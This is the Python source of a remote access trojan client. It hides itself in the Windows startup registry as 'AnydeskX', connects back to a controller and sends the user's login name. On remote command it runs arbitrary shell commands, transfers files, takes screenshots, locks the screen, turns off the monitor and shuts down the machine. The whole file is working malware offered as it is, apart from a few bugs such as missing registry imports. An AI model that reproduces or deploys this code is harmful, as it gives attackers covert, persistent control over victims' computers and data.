#!/usr/bin
# Made by p3rpl3x
import socket
import subprocess
import time
import json
import os
import base64
import ctypes
import sys
import platform
from xmlrpc.client import Server
import pyautogui
import string
import random
from time import gmtime, strftime

import requests

#############################################################################

IP = 'localhost'
PORT = 42069

#############################################################################

class Startup:
   # Adds the script to startup
   def addStartup(registry_name):
       fp = os.path.dirname(os.path.realpath(__file__))
       file_name = sys.argv[0].split('\\')[-1]
       new_file_path = fp + "\\" + file_name
       keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
       key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
       SetValueEx(key2change, registry_name, 0, REG_SZ, new_file_path )

#=====================================================================#

class Utils:

    def get_random_string(length):
        # choose from all lowercase letter
        letters = string.ascii_lowercase
        result_str = ''.join(random.choice(letters) for i in range(length))
        return result_str

#=====================================================================#

    def get_sysinfo():

        ip = requests.get('https://api.ipify.org').content.decode('utf-8')

        info = f"""
        ╭──────────────────╮
        │               IP │ >> {ip}
        │           System │ >> {platform.system()}  
        │        Processor │ >> {platform.processor()}
        │       Local Time │ >> {Utils.get_local_time()}
        │     Architecture │ >> {platform.architecture()[0]}
        │     Network Name │ >> {platform.node()}
        │ Operating System │ >> {platform.platform()}
        ╰──────────────────╯
        
        """
        return info

#=====================================================================#

    def is_admin():
        try:
            temp = os.listdir(os.sep.join([os.environ.get("SystemRoot", "C:\windows"), 'temp']))
        except:
            admin = "[-] User Privileges!"
        else:
            admin = "[+] Administrator Privileges!"

        return admin

#=====================================================================#

    def get_local_time():
        return strftime("%d.%m.%Y %H:%M:%S", gmtime())


#=====================================================================#

    def take_ss():
        screen_shot = pyautogui.screenshot()
        global screenshot_name
        screenshot_name = Utils.get_random_string(16)
        screen_shot.save("./" + screenshot_name + ".png")

#=====================================================================#

    def turn_monitor_off():
        if sys.platform.startswith('linux'):
            import os
            os.system("xset dpms force off")

        elif sys.platform.startswith('win'):
            import win32gui
            import win32con
            SC_MONITORPOWER = 0xF170
            win32gui.SendMessageTimeout(win32con.HWND_BROADCAST,
                win32con.WM_SYSCOMMAND, 
                SC_MONITORPOWER, 2, 
                win32con.SMTO_NOTIMEOUTIFNOTHUNG, 
                1000)

#=====================================================================#

    def turn_monitor_on():
        if sys.platform.startswith('linux'):
            import os
            os.system("xset dpms force on")

        elif sys.platform.startswith('win'):
            import win32gui
            import win32con
            SC_MONITORPOWER = 0xF170
            win32gui.SendMessageTimeout(win32con.HWND_BROADCAST,
                win32con.WM_SYSCOMMAND, 
                SC_MONITORPOWER, 2, 
                win32con.SMTO_NOTIMEOUTIFNOTHUNG, 
                1000)


#=====================================================================#


class RatConnector:
    def __init__(self, ip, port):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
                self.data_send(os.getlogin())
            except socket.error:
                print("[-] Server is not online? Try again in 5 seconds!")
                time.sleep(5)
            else:
                break

#=====================================================================#

    def data_send(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

#=====================================================================#

    # Function for receiving data as JSON
    def data_receive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            # If ValueError returned then more data needs to be sent
            except ValueError:
                continue

#=====================================================================#

    def array_to_string(self, strings):
        convStr = ""
        for i in strings:
            convStr += " " + i 
        return convStr

#=====================================================================#

    # Run any command on the system
    def run_command(self, command):
        return subprocess.check_output(
            command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        )

#=====================================================================#

    # Reading files with base 64 encoding for non UTF-8 compatability
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

#=====================================================================#

    # Writing files, decode the b64 from the above function
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload complete"

#=====================================================================#

    def run(self):
         while True:
            command = self.data_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()

                elif command[0] == "help":
                    commandResponse = ""
                
                elif command[0] == "clear":
                    commandResponse = ""

                elif command[0] == "screenshot":
                    Utils.take_ss()
                    commandResponse = f"[+] Filename: {screenshot_name}.png"

                elif command[0] == "cd" and len(command) > 1:
                    os.chdir(str(command[1]).replace("~", " "))
                    commandResponse = "[+] Changing active directory to " + command[1]
                
                elif command[0] == "upload":
                    commandResponse = self.write_file(command[1], command[2])

                elif command[0] == "download":
                    commandResponse = self.read_file(command[1]).decode()

                elif command[0] == "lock":
                    ctypes.windll.user32.LockWorkStation()
                    commandResponse = "[+] Clients PC locked"

                elif command[0] == "checkadmin":
                    commandResponse = Utils.is_admin()

                elif command[0] == "turnmonoff":
                    Utils.turn_monitor_off()
                    commandResponse = "[+] Clients Monitor Screen is now off"
                
                elif command[0] == "turnmonon":
                    Utils.turn_monitor_on()
                    commandResponse = "[+] Clients Monitor Screen is now on"

                elif command[0] == "localtime":
                    commandResponse = f"\tlocal time | {Utils.get_local_time()}"

                elif command[0] == "shutdown":
                    os.system("shutdown /s /t 1")

                elif command[0] == "reboot":
                    os.system("shutdown /r /t 1")
                
                elif command[0] == "sysinfo":
                    commandResponse = Utils.get_sysinfo()
                
                else:
                    convCommand = self.array_to_string(command)
                    commandResponse = self.run_command(convCommand).decode()
            # Whole error handling, bad practice but required to keep connection
            except Exception as e:
                commandResponse = f"[-] Error running command: {e}"
            self.data_send(commandResponse)

#=====================================================================#

if os.name == "nt":
    Startup.addStartup('AnydeskX')

ratClient = RatConnector(IP, PORT)
ratClient.run()
